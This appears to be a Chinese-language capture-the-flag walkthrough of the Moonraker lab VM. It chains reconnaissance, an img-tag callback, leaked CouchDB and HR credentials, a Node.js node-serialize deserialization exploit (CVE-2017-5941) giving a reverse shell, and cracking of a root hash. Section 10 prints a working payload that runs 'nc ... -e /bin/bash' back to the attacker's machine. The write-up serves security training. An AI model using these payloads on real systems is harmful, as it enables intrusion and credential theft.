VMware双击打开，nat模式运行即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP

Nmap scan report for 192.168.253.247
Host is up (0.00072s latency).

--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.247 -p- -A

22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
3000/tcp  open  http    Node.js Express framework
4369/tcp  open  epmd    Erlang Port Mapper Daemon
5984/tcp  open  http    CouchDB httpd 2.2.0 (Erlang OTP/19)
40417/tcp open  unknown


--------------------------------------------
--------------------------------------------
3、web信息收集


访问80页面等待发现：
http://192.168.253.247/moonraker.html

dirb http://192.168.253.247/ 
http://192.168.253.247/services/
访问发现按钮：send an inquiry

提示：
To provide "out of this world" service, a Sales rep will check your web-based inquiries in under 5 minutes!
基于网络的查询有人会检查我们，并会在5分钟内与我们联系！

--------------------------------------------
--------------------------------------------
4、计划任务信息泄露

kali开启apache:
service apache2 start
cd /var/www/html
创建一个txt文本！

<img src="http://192.168.253.138/1.txt"></img>

等到五分钟通过访问apache2 access.log信息查看：
locate access.log
cat /var/log/apache2/access.log

发现内容：
192.168.253.247 - - [19/May/2022:20:57:59 -0400] "GET /1.txt HTTP/1.1" 200 285 "http://127.0.0.1/svc-inq/salesmoon-gui.php" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.8 Safari/534.34"

日志暴露了一个新网页：
http://192.168.253.247/svc-inq/salesmoon-gui.php
出现按钮：Back to Sales Admin Interface（销售管理界面）

打开CouchDB Notes 并获得了一些关于 CouchDB 登录的登录凭证的提示：
女朋友的名字 + "x99" 不带引号

谷歌搜：jaws女朋友
拉瓦萊克 因在 1979 年詹姆斯邦德電影 Moonraker 中扮演 Jaws 的女友 Dolly 而聞名。

dolly


--------------------------------------------
--------------------------------------------
5、Apache CouchDB中的Fauxton信息泄露

找到账号密码后，需要了解Apache CouchDB中的Fauxton！

https://blog.csdn.net/weixin_51799151/article/details/123347534

CouchDB是一种免费的、开源的、NoSQL数据库。Apache CouchDB 是一个面向文档的数据库管理系统！
默认端口号：5984、6984

http://www.srcmini.com/11188.html
CouchDB Fauxton是基于Web的内置管理界面。使用非常简单。它提供了一个简单的图形界面来与CouchDB进行交互。它提供对所有CouchDB功能的完全访问权限。

http://127.0.0.1:5984/_utils/   ---如何启动Fauxton


http://192.168.253.247:5984/_utils/
jaws
dollyx99

在links数据库中发现表：10cbcebcd3dd9df29ec393b7da0044bc
表中发现内容：
http://192.168.253.247/HR-Confidential/offer-letters.html

上面的链接打开了一个OFFER LETTER ARCHIVE BACKUP WEBPAGE，点击页面出现：
http://192.168.253.247/HR-Confidential/moonraker_guard.pdf

这是一封录取通知书，发现账号密码信息：Offer Letter: HUGO
Username: hugo
Password: TempleLasersL2K


--------------------------------------------
--------------------------------------------
6、Node.js 反序列化漏洞   项目二十五

从NMAP扫描输出中，知道端口3000包含一个Node.js框架：
http://192.168.253.247:3000/
hugo
TempleLasersL2K

登录发现：
Welcome Boss Your manifesto has been recorded here for reference: /accounting/hugo-manif.mp3

http://192.168.253.247/accounting/hugo-manif.mp3   ---没任何有用的信息

启动Burp Suite并拦截该页面的请求：
Cookie: AuthSession=amF3czo2Mjg2RjA4QToKrU69pYZ3Ka_d-oSKAXcybeFNvQ; profile=eyJ1c2VybmFtZSI6Imh1Z28ifQ%3D%3D   ---base64 编码


CVE-2017-5941
Node.js 反序列化漏洞用于远程代码执行：
https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py

python nodejsshell.py 192.168.253.138 5566

生成序列化的有效内容，并在函数体后添加括号()：payload（一）
{"rce":"_$$ND_FUNC$$_function (){payload}()"}

nc -vlp 5566
BP发送：
profile=

成功获得反弹shell！

python -c 'import pty; pty.spawn("/bin/bash")'


--------------------------------------------
--------------------------------------------
7、内网信息收集

1）Linux version 4.9.0-7-amd64
/usr/bin/node /home/jaws/boss/app.js

2）用户信息
couchdb:x:114:121:CouchDB Administrator,,,:/opt/couchdb:/bin/bash
hr:x:1000:1000:,,,:/home/hr:/bin/bash
hugo:x:1002:1002:,42,,:/home/hugo:/bin/bash
jaws:x:1001:1001:,,,:/home/jaws:/bin/bash
moonrakertech:x:1003:1003::/home/moonrakertech:/bin/bash
root:x:0:0:root:/root:/bin/bash
sales:x:1004:1004:,,,:/home/sales:/bin/bash

3）信息泄露
[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
/opt/couchdb/etc/local.ini.test
[+] Interesting GROUP writable files (not in Home) (max 500)
/opt/couchdb/etc/local.ini.test


cd /opt/couchdb/etc/
cat local.ini

hugo
321Blast0ff!!
发现账号密码信息！

在/home/jaws/.bash_history也发现了相关的信息：
cd /home/jaws
cat .bash_history
cat local.ini

--------------------------------------------
--------------------------------------------
8、邮件信息枚举

阅读Hugo的电子邮件：
cd /var/mail

Also your ticket has been complete. Since I'm feeling nice today, I'm including the password here in its native hash and not in the ticket. BTW this is the old password hash, the new one is the same + "VR00M" without quotes.

提示：root密码后添加VR00M

root:$6$auLf9y8f$qgi63MGYQGnnk6.6ktcZIMpROPMqMXMEM7JufH1aTIApIPIZZu7yRjfIcZ1pELNoeMM7sIwCrVmMCjNYJRRGf/:17809:0:99999:7:::


--------------------------------------------
--------------------------------------------
9、暴力破解-john

写入文本john爆破：

john 1
cyber            (root)

su root
cyberVR00M




--------------------------------------------
--------------------------------------------
10、拓展知识：

payload（二）：
--------------
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('nc 192.168.253.138 7777 -e /bin/bash', function(error, stdout, stderr ) { console.log(stdout) });\n }()"}
--------------
CouchDB垂直权限绕过漏洞？？？

代码审计：
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

grep -rn unserialize
raker-sales/hugo.txt:20:	    var obj = serialize.unserialize(str);
cat raker-sales/hugo.txt

--------------
var serialize = require('node-serialize');   ---序列化和反序列化模块
var str = new Buffer(req.cookies.profile, 'base64').toString();
var obj = serialize.unserialize(str);
--------------
官方解释：
unserialize()通过传递带有立即调用函数表达式（IIFE）的序列化JavaScript对象，可以利用传递到节点序列化模块中的函数的不受信任的数据来实现任意代码执行。

在函数体之后使用IIFE括号，则该函数将在对象创建时被调用！

https://developer.mozilla.org/zh-CN/docs/Glossary/IIFE：
IIFE（立即调用函数表达式）是一个在定义时就会立即执行的  JavaScript 函数。

node-serialize的序列化/反序列化模块

个人理解：
Web应用程序中的漏洞是它从HTTP请求中读取名为profile的cookie，对cookie值执行base64解码，并将其传递给unserialize()函数。由于cookie是不受信任的输入，攻击者可以制作恶意Cookie值以利用此漏洞。然后传递的恶意代码经过base64编码通过cookie值传递给unserialize()函数，通过node-serialize模块进行序列化/反序列化过程，在恶意代码后输入IIFE（立即调用函数表达式）括号，在对象被创建时函数就会马上被调用。有点类似于C中的类构造函数，最终执行了恶意代码获得反弹shell！


理解img src：
https://www.w3school.com.cn/tags/att_img_src.asp

<img> 标签的 src 属性是必需的。它的值是图像文件的 URL，也就是引用该图像的文件的的绝对路径或相对路径。








































